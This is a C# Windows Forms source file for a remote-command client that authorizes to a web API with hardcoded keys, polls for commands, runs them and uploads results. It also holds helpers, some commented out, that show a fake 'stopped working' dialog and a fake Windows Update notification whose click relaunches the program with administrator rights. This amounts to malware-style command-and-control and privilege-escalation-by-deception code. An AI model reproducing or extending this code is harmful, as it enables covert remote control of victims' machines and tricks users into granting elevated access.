using System;
using System.Windows.Forms;
using System.IO;
using Library;
using Client.Properties;
using System.Security.Principal;
using ClientHandler;
using PluginManager;

namespace Client
{
    public partial class Form1 : Form, IPluginHost
    {
        public bool HasInternetConnection
        {
            get { return false; }
        }

        public Form1(string[] args)
        {
            InitializeComponent();
            Setup();
        }

        private void Setup()
        {
            AppendText("Initializing...");
            AppendText("Authorizing...");
            Handler.Instance.OnAuthorizedEvent += (o, e) =>
            {
                if (e.IsAuthenticated)
                {
                    AppendText("Successfully authorized");
                    AppendText("Waiting for a command...");
                }
                else
                {
                    AppendText("Authorization failed");
                }
            };
            Handler.Instance.Initialize(new HandlerInitData()
            {
                HostForm = this,
                Url = new Uri("http://localhost:64737/api"),
                //Url = new Uri("http://restlesshoneyseeker.azurewebsites.net/api"),
                APIKEY_PRIVATE = "ca71ab6e833b109d781c722118d2bff373297dc1",
                APIKEY_PUBLIC = "a12ee5029cbf44c55869ba6d629b683d8f0044ef",
                CONNECTION_TIMEOUT = 10000,
                CONNECTION_INTERVAL = 10000,
                StartNewProcessOnExit = false,
                HideOnStart = false
            });
            Handler.Instance.OnCommandEvent += (o, e) =>
            {
                var settings = Handler.Instance.Transmitter.TSettings;
                var command = e.Command;
                if (command != ECommand.DoNothing)
                {
                    if (Handler.Instance.TransmitterStatus == TransmitterStatus.IDLE)
                    {
                        AppendText("Received command: " + command + ", File: " + settings.File + ", Parameters: " + settings.Parameters);// + ", Status: " + settings.Status);
                        Handler.Instance.ExecuteCommand(command);
                    }
                    if (Handler.Instance.TransmitterStatus == TransmitterStatus.BUSY)
                    {
                        AppendText("Working... Command: " + command);
                        if (Handler.Instance.Worker.IsDone)
                        {
                            AppendText("Uploading results...");
                            Handler.Instance.StopWork();
                            AppendText("Done!");
                            AppendText("Waiting for a command...");
                        }
                        else
                        {
                            //ExecuteCommand(command);
                        }
                    }
                }
            };
            //LoadPlugins();
            //SetupFakeMsg();
            //CreateFakeWindowsUpdateNotifyIcon(1000,  "New updates are available", "Click to install them using Windows Update.");
        }

        void AppendText(string text)
        {
            richTextBox1.AppendText(string.Format("{0:G}", DateTime.Now) + " : " + text + Environment.NewLine);
        }

        private void SetupFakeMsg()
        {
            var fakeForm = new FormStoppedWorking();
            fakeForm.ShowDialog();
            fakeForm.FormClosing += (o, e) =>
            {
                //HideForm();
            };
        }

        private void CreateFakeWindowsUpdateNotifyIcon(int msDelay, string title, string text)
        {
            System.Timers.Timer timer = new System.Timers.Timer(msDelay);
            timer.Elapsed += (o, e) =>
            {
                timer.Enabled = false;
                var notifyIcon = new NotifyIcon();
                notifyIcon.Icon = Resources.windows_update_icon_2;
                notifyIcon.BalloonTipIcon = ToolTipIcon.Warning;
                notifyIcon.BalloonTipTitle = title;
                notifyIcon.BalloonTipText = text;
                notifyIcon.Visible = true;
                notifyIcon.Click += (nio, nie) =>
                {
                    notifyIcon.ShowBalloonTip(5000);
                };
                notifyIcon.BalloonTipClicked += (btco, btce) =>
                {
                    var pricipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
                    var hasAdministrativeRight = pricipal.IsInRole(WindowsBuiltInRole.Administrator);
                    if (!hasAdministrativeRight)
                    {
                        if (Handler.Instance.RunElevated(Application.ExecutablePath))
                        {
                            this.Close();
                            Application.Exit();
                        }
                    }
                };
                notifyIcon.ShowBalloonTip(5000);
            };
            timer.Enabled = true;
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            try
            {
                Handler.Instance.Transmitter.DeAuthorize();
            }
            catch { }
        }
    }
}